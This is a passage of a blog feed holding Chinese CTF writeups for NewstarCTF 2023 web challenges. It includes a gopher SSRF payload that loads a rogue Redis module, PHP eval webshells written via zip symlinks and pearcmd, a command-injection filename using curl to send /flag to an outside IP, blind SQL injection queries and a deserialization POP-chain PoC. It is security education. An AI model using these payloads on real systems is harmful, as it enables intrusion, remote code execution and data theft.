gopher://db:6379/_%2A%31%0D%0A%24%30%0D%0A%0D%0A%2A%33%0D%0A%24%37%0D%0A%73%6C%61%76%65%6F%66%0D%0A%24%31%32%0D%0A%38%2E%31%34%30%2E%32%35%33%2E%31%38%0D%0A%24%35%0D%0A%35%31%39%39%37%0D%0A%2A%34%0D%0A%24%36%0D%0A%63%6F%6E%66%69%67%0D%0A%24%33%0D%0A%73%65%74%0D%0A%24%33%0D%0A%64%69%72%0D%0A%24%34%0D%0A%2F%74%6D%70%0D%0A%2A%34%0D%0A%24%36%0D%0A%63%6F%6E%66%69%67%0D%0A%24%33%0D%0A%73%65%74%0D%0A%24%31%30%0D%0A%64%62%66%69%6C%65%6E%61%6D%65%0D%0A%24%36%0D%0A%65%78%70%2E%73%6F%0D%0A%2A%31%0D%0A%24%34%0D%0A%71%75%69%74%0D%0A%2A%31%0D%0A%24%30%0D%0A%0D%0A&#x27;</span>);<br><span class="hljs-meta">?&gt;</span> <span class="hljs-comment">#1.php</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Location: gopher://db:6379/_%2A%33%0D%0A%24%37%0D%0A%73%6C%61%76%65%6F%66%0D%0A%24%32%0D%0A%6E%6F%0D%0A%24%33%0D%0A%6F%6E%65%0D%0A%2A%33%0D%0A%24%36%0D%0A%6D%6F%64%75%6C%65%0D%0A%24%34%0D%0A%6C%6F%61%64%0D%0A%24%31%31%0D%0A%2F%74%6D%70%2F%65%78%70%2E%73%6F%0D%0A%2A%32%0D%0A%24%31%31%0D%0A%73%79%73%74%65%6D%2E%65%78%65%63%0D%0A%24%35%0D%0A%27%65%6E%76%27%0D%0A%2A%31%0D%0A%24%34%0D%0A%71%75%69%74%0D%0A%2A%31%0D%0A%24%30%0D%0A%0D%0A&#x27;</span>);<br><span class="hljs-meta">?&gt;</span> <span class="hljs-comment">#2.php</span><br></code></pre></td></tr></table></figure><p>在当前文件夹下执行<code>php -S 0.0.0.0:52000</code>，可以试着用浏览器自己访问一下是否修改了请求头</p><p>然后注意，要加载<code>.so</code>恶意文件的话，你master下面肯定得有对不对，所以还得先<code>git clone</code>一下</p><p>并且看到生成payload的<code>exp.so</code>文件放在<code>/tmp</code>目录下，所以得在<code>/tmp</code>下克隆，用哪个其实都是可以的</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">git clone https://github.com/Dliv3/redis-rogue-server.git<br></code></pre></td></tr></table></figure><p>另起一个vps窗口，进入<code>/tmp</code>目录复制仓库后，照redis-rogue-server.py&#96;的help开一下监听，这里是被动连接</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">python3 redis-rogue-server.py --lport 51997 --server-only<br></code></pre></td></tr></table></figure><p>记得<code>lport</code>的端口要和payload的端口一致</p><p>至于我踩的坑那就是我用nc去监听了，结果一直卡在PING就毫无响应，实际上这样是没法调用<code>.so</code>的</p><p>——————————————————————————————————————————————————</p><h4 id="zip-manager"><a href="#zip-manager" class="headerlink" title="zip_manager"></a>zip_manager</h4><p>这个也学习一下，关于<code>zip</code>软链接的使用，如果使用<code>unzip</code>命令解压缩压缩文件的话就会引起这个问题</p><p>当你通过<code>ln</code>命令将一个目录和一个路径关联起来，那么对这个目录的操作都会指向关联的那个路径</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">ln -s / test<br></code></pre></td></tr></table></figure><p>这就代表<code>test</code>指向了<code>/</code>目录，用<code>ls -liah</code>能看到<code>test -&gt; /</code>这样的信息，所以我们只需要对<code>test</code>进行压缩</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">zip -y test.zip ./test<br><span class="hljs-meta prompt_">#</span><span class="language-bash">-y:保留软连接压缩</span><br></code></pre></td></tr></table></figure><p>这样解压出的<code>test</code>的读或者写都会表示在<code>/</code>下的读或者写，如果说解压缩但是没有回显给你，那么可以考虑写马</p><p>只需要添加一步操作，在同名<code>test</code>目录（可以不是这个test目录）下写一个一句话木马，然后再压缩一遍</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">cd ./test;echo &quot;&lt;?php @eval($_GET[&#x27;cmd&#x27;]);?&gt;&quot; &gt; cmd.php;cd ..<br>zip -y test1.zip ./test<br></code></pre></td></tr></table></figure><p>第一次先传入<code>test.zip</code>，解压缩出来的<code>test</code>会指向根目录；第二次再传<code>test1.zip</code>，解压出的test会覆盖原来的<code>test</code>，但是软链接的属性仍然还在，所以会把<code>cmd.php</code>写入根目录，或者直接一步完成（如果题目条件可观</p><p>题解里还有拼接命令RCE，这里也贴一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/unzip&#x27;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">unzip</span>():<br>    f = request.files.get(<span class="hljs-string">&#x27;file&#x27;</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> f.filename.endswith(<span class="hljs-string">&#x27;.zip&#x27;</span>):<br>        <span class="hljs-keyword">return</span> redirect(<span class="hljs-string">&#x27;/&#x27;</span>)<br><br>    user_dir = os.path.join(<span class="hljs-string">&#x27;./uploads&#x27;</span>, md5(request.remote_addr))<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.exists(user_dir):<br>        os.mkdir(user_dir)<br><br>    zip_path = os.path.join(user_dir, f.filename)<br>    dest_path = os.path.join(user_dir, f.filename[:-<span class="hljs-number">4</span>])<br>    f.save(zip_path)<br><br>    os.system(<span class="hljs-string">&#x27;unzip -o &#123;&#125; -d &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(zip_path, dest_path))<br>    <span class="hljs-keyword">return</span> redirect(<span class="hljs-string">&#x27;/&#x27;</span>)<br></code></pre></td></tr></table></figure><p>可以看到<code>os.system</code>执行了系统命令，而且通过格式化字符串拼接了可传入的参数，那么这里就文章可做了</p><p>我们知道linux命令如果用分号隔开是可以一行执行多条命令的，所以我们只需要满足后缀为<code>.zip</code>，在中间写入我们想要执行的命令，并用分号隔开就可以了，但是因为没有回显，所以考虑<code>curl</code>外带出flag</p><p>但是得用base64编码过后echo发包（埋个坑），如果用初始<code>curl</code>发包的话会500_status</p><p>burp抓<code>/unzip</code>路由下的包，修改<code>filename</code>如下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">test.zip;curl 8.140.253.18:51996 -T /flag;1.zip<br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-built_in">base64</span>编码过后<span class="hljs-built_in">echo</span>发包</span><br>test.zip;echo Y3VybCA4LjE0MC4yNTMuMTg6NTE5OTYgLVQgL2ZsYWc=|base64 -d|bash;1.zip<br></code></pre></td></tr></table></figure><p>——————————————————————————————————————————————————</p><h3 id="Week4"><a href="#Week4" class="headerlink" title="Week4"></a>Week4</h3>]]></content>
    
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>writeup</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>NewstarCTF2023 Writeup</title>
    <link href="/2023/12/06/NewstarCTF2023/"/>
    <url>/2023/12/06/NewstarCTF2023/</url>
    
    <content type="html"><![CDATA[<h1 id="NewstarCTF2023"><a href="#NewstarCTF2023" class="headerlink" title="NewstarCTF2023"></a>NewstarCTF2023</h1><p>——Jednersaous</p><h2 id="WEB-week3"><a href="#WEB-week3" class="headerlink" title="WEB-week3"></a>WEB-week3</h2><h3 id="include-pear"><a href="#include-pear" class="headerlink" title="include pear"></a>include pear</h3><p>这道题是我没见过的，本来一开始还没意识到题那个梨的emoji是什么意思，后来才恍然大悟</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>])) &#123;<br>        <span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>        <br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/flag|log|session|filter|input|data/i&#x27;</span>, <span class="hljs-variable">$file</span>)) &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;hacker!&#x27;</span>);<br>        &#125;<br>        <br>        <span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>.<span class="hljs-string">&quot;.php&quot;</span>);<br>        <span class="hljs-comment"># Something in phpinfo.php!</span><br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>    &#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>看到include第一反应应该是php伪协议，但是后面限制了文件后缀，其实过不过滤也差不多？除非又能把后面的.php给无效了</p><p>题目说phpinfo.php里有东西，结果找到个fakeflag&#x3D; fake{Check_register_argc_argv}</p><p>打开源码Ctrl+f 开搜，发现register_argc_argv&#x3D;1，好，那么好，又得浏览器开搜了（没见过啊</p><p>找到了LFI,RCE,pearcmd等好多东西</p><blockquote><p>参考连接:</p><p><a href="https://longlone.top/%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/register_argc_argv%E4%B8%8Einclude%20to%20RCE%E7%9A%84%E5%B7%A7%E5%A6%99%E7%BB%84%E5%90%88/">https://longlone.top/%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/register_argc_argv%E4%B8%8Einclude%20to%20RCE%E7%9A%84%E5%B7%A7%E5%A6%99%E7%BB%84%E5%90%88/</a></p><p><a href="https://blog.csdn.net/qq_50643984/article/details/126598547">https://blog.csdn.net/qq_50643984/article/details/126598547</a></p><p>甚至有去年Newstar的同类型题？？？（绷</p><p><a href="https://blog.csdn.net/weixin_53090346/article/details/127241278">https://blog.csdn.net/weixin_53090346/article/details/127241278</a></p></blockquote><p>但我搜了是搜了，确实是没理解，什么LFI to RCE云云，确实是没太懂</p><p>payload:</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-link">http:靶机ip?+config-create+/&amp;file=/usr/local/lib/php/pearcmd&amp;/&lt;?=eval($_POST</span>[<span class="hljs-string">1</span>])?&gt;+/var/www/html/a.php<br></code></pre></td></tr></table></figure><p><strong>Pay attetion here:一定要用Burp传这个payload,不然在url里传会被直接转义，然后gg</strong></p><p>传payload之后，会在默认开启web服务的文件夹下新建一个a.php，其中有你传入的代码，传入成功是有回显的</p><p>随后就可以打开http:靶机ip&#x2F;a.php</p><p>然后hackbar传参给1这个变量，可以看到这个是不出网的，不用拿shell</p><p>直接1&#x3D;system(‘cat &#x2F;flag’);这个&#x2F;flag在题目源码中有暗示</p><p>虽然没懂，但是涨知识了（？</p><p>至少我知道了这个代码怎么工作，那些巨擘们是完全理解了之后才能写出这样的payload的话</p><p><strong>那也太恐怖了……</strong></p><p>——————————————————————————————————————————</p><h3 id="medium-sql"><a href="#medium-sql" class="headerlink" title="medium_sql"></a>medium_sql</h3><p>稍微开了下环境做了下，由于我没看wp不知道别人是怎么做的，但我从上一题沿用的盲注好像还是能行啊？</p><p>盲注永远的神（？？？</p><p>这次我一定写一个脚本来注（他妈的</p><p>没对大小写进行过滤</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs markdown">payload:<br>ASCII(SUBSTR((SELECT table<span class="hljs-emphasis">_name from INFORMATION_</span>schema.<span class="hljs-code">`TABLES`</span> Where table<span class="hljs-emphasis">_schema = database() limit 0,1),1,1))</span><br><span class="hljs-emphasis"></span><br><span class="hljs-emphasis">length(SELECT table_</span>name from INFORMATION<span class="hljs-emphasis">_schema.`TABLES` Where table_</span>schema = database() limit 0,1)&gt;=3<br>ASCII(SUBSTR((SELECT column<span class="hljs-emphasis">_name from INFORMATION_</span>schema.<span class="hljs-code">`COLUMNS`</span> Where table<span class="hljs-emphasis">_name=&#x27;grades&#x27; limit 0,1),1,1))</span><br><span class="hljs-emphasis"></span><br><span class="hljs-emphasis">ASCII(SUBSTR((SELECT column_</span>name from INFORMATION<span class="hljs-emphasis">_schema.`COLUMNS` Where table_</span>name=&#x27;here<span class="hljs-emphasis">_is_</span>flag&#x27; limit 0,1),1,1))<br></code></pre></td></tr></table></figure><p>用我这个没问题（笑</p><p>偷懒——————————————————————————————————————</p><h3 id="POP-Gadget"><a href="#POP-Gadget" class="headerlink" title="POP Gadget"></a>POP Gadget</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Begin</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>    <br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[a-zA-Z0-9]/&quot;</span>,<span class="hljs-variable">$this</span>-&gt;name))&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Hello&quot;</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Welcome to NewStarCTF 2023!&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Then</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$func</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        (<span class="hljs-variable language_">$this</span>-&gt;func)();<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Good Job!&quot;</span>;<br>    &#125;<br><br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Handle</span></span>&#123;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$obj</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$func</span>, <span class="hljs-variable">$vars</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;obj-&gt;<span class="hljs-title function_ invoke__">end</span>();<br>    &#125;<br><br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Super</span></span>&#123;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$obj</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;obj-&gt;<span class="hljs-title function_ invoke__">getStr</span>();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">end</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;==GAME OVER==&quot;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CTF</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$handle</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">end</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">unset</span>(<span class="hljs-variable language_">$this</span>-&gt;handle-&gt;log);<br>    &#125;<br><br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">WhiteGod</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$func</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$var</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__unset</span>(<span class="hljs-params"><span class="hljs-variable">$var</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        (<span class="hljs-variable language_">$this</span>-&gt;func)(<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-keyword">var</span>);    <br>    &#125;<br>&#125;<br>@<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;pop&#x27;</span>]);<br></code></pre></td></tr></table></figure><p>我对于php序列化和反序列化的认知还停留在十分简单的阶段，这题确实是给了我当头一棒，我也认识到了什么是POP链</p><blockquote><p>参考:<br><a href="https://www.cnblogs.com/th0r/p/14152102.html">https://www.cnblogs.com/th0r/p/14152102.html</a></p><p><a href="https://www.php.net/manual/zh/language.oop5.magic.php">https://www.php.net/manual/zh/language.oop5.magic.php</a></p></blockquote><p>首先对源码做一下分析:</p><p>直接看最后，定义了两个可以传入的参数$func,$var，还有个__unset函数里面调用了如下式子</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs kotlin">($<span class="hljs-keyword">this</span>-&gt;func)($<span class="hljs-keyword">this</span>-&gt;<span class="hljs-keyword">var</span>)<br></code></pre></td></tr></table></figure><p>看起来就很像能够执行system命令的样子</p><p>看到WhiteGod类调用了__unset魔术方法，php官网的解释是</p><p><strong>当对不可访问（protected 或 private）或不存在的属性调用unset()时， __unset会被调用</strong></p><p>回到源码中去找哪里调用了unset()函数，可以看到CTF类调用了unset</p><p>且unset传入的参数是$this-&gt;handle-&gt;log，handle有定义可控，但是log又是什么属性呢（？</p><p>暂时先不管，总之是要把handle设置为new WhiteGod()以便能调用__unset</p><p>其实正是对未定义的属性调用了unset()，所以才会触发__unset，因此没必要考虑log是什么，就是个未定义量</p><p>回到CTF类，调用unset的定义函数是end()，我们要在注入POP链后执行end函数，那么应该从哪里去找调用$CTF.end()的地方呢</p><p>可以看到Handle类中有魔术方法__call,php官网的解释是</p><p><strong>在对象中调用一个不可访问方法时，__call会被调用</strong></p><p>显然Handle类中的protected $obj应该就是一个CTF类，这样便可以调用end()方法</p><p>可以发现Super类中有魔术方法__invoke，php官网的解释是</p><p><strong>当尝试以调用函数的方式调用一个对象时，__invoke方法会被自动调用</strong></p><p>所以我们只需要找到形如$object()这样的表达式，最后发现Then类调用了($this-&gt;func)()，所以</p><p>($this-&gt;func)应为一个Super类，但是要触发($this-&gt;func)()，必须先触发__toString魔术方法，php官网的解释是</p><p><strong>__toString方法用于一个类被当成字符串时应怎样回应</strong></p><p>最经典的就是echo，print等函数，在这道题目中，我们可以发现Begin的__destruct魔术方法调用了preg_match</p><p>这是一个经典的字符串处理函数，所以只需要保证$this-&gt;name是我传入的一个Then类即可</p><p>综合上述，我们已经可以得到一条逻辑链</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xl">B<span class="hljs-function"><span class="hljs-title">egin</span>:$this-&gt;</span><span class="hljs-function"><span class="hljs-title">name</span>   ---------&gt;</span>   Then<br>T<span class="hljs-function"><span class="hljs-title">hen</span>:$this-&gt;</span><span class="hljs-function"><span class="hljs-title">func</span>    ---------&gt;</span>   Super<br>S<span class="hljs-function"><span class="hljs-title">uper</span>:$this-&gt;</span><span class="hljs-function"><span class="hljs-title">obj</span>    ---------&gt;</span>   Handle<br>H<span class="hljs-function"><span class="hljs-title">andle</span>:$this-&gt;</span><span class="hljs-function"><span class="hljs-title">obj</span>   ---------&gt;</span>   CTF<br>CTF:$<span class="hljs-function"><span class="hljs-title">this</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">handle</span>   ---------&gt;</span>   WhiteGod<br></code></pre></td></tr></table></figure><p><strong>Pay attention:</strong></p><p>值得注意的是，在php序列化过程中，对于public,protected,private变量的序列化有所不同</p><p>对于public变量是直接var_dump()，没有加任何的保护</p><p>对于protected变量，假设protected $a&#x3D;’123’，那么序列化之后就是s:6:<em><em>%00</em>%00</em><em>123，我将其与public变量序列化不同的部分加粗，所以在传参的时候最好使用burp，在Hex栏中在</em>号的前后补上hex(00)，以充当%00</p><p>对于private变量，假设protected $a&#x3D;’123’，且类名为number，那么序列化之后就是s:11:<strong>%00number%00</strong>123，在php-echo预览出来的效果是没有%00的，就是类名加上数据，传参同protected</p><p>其次需要用得到一些OOP的思想，首先我们明确一点:protected和private变量在类外部是不可写的</p><p>所以在写poc的时候，不能用$a-&gt;protected variable来修改其值，而是得在类的内部重新写一个public方法</p><p>用这个public方法来修改protected或者private变量的值</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs php">poc:<br><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Begin</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Then</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$func</span>;<br>    <br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">construct</span>(<span class="hljs-params"><span class="hljs-variable">$k</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;func=<span class="hljs-variable">$k</span>;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Handle</span></span>&#123;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$obj</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">construct</span>(<span class="hljs-params"><span class="hljs-variable">$k</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;obj=<span class="hljs-variable">$k</span>;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Super</span></span>&#123;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$obj</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">construct</span>(<span class="hljs-params"><span class="hljs-variable">$k</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;obj=<span class="hljs-variable">$k</span>;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CTF</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$handle</span>;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">WhiteGod</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$func</span>=<span class="hljs-string">&#x27;var_dump&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$var</span>=<span class="hljs-string">&#x27;666&#x27;</span>;<br>&#125;<br><span class="hljs-variable">$a</span>= <span class="hljs-keyword">new</span> <span class="hljs-title class_">Begin</span>();<br><span class="hljs-variable">$b</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Then</span>();<br><span class="hljs-variable">$c</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Super</span>();<br><span class="hljs-variable">$d</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Handle</span>();<br><span class="hljs-variable">$e</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">CTF</span>();<br><span class="hljs-variable">$f</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">WhiteGod</span>();<br><span class="hljs-variable">$e</span>-&gt;handle=<span class="hljs-variable">$f</span>;<br><span class="hljs-variable">$d</span>-&gt;<span class="hljs-title function_ invoke__">construct</span>(<span class="hljs-variable">$e</span>);<br><span class="hljs-variable">$c</span>-&gt;<span class="hljs-title function_ invoke__">construct</span>(<span class="hljs-variable">$d</span>);<br><span class="hljs-variable">$b</span>-&gt;<span class="hljs-title function_ invoke__">construct</span>(<span class="hljs-variable">$c</span>);<br><span class="hljs-variable">$a</span>-&gt;name=<span class="hljs-variable">$b</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br></code></pre></td></tr></table></figure><p>传参用burp然后修改hex就可^ _ ^</p><p>——————————————————————————————————————————————————</p><h3 id="R-C-E"><a href="#R-C-E" class="headerlink" title="R!!!C!!!E!!!"></a>R!!!C!!!E!!!</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 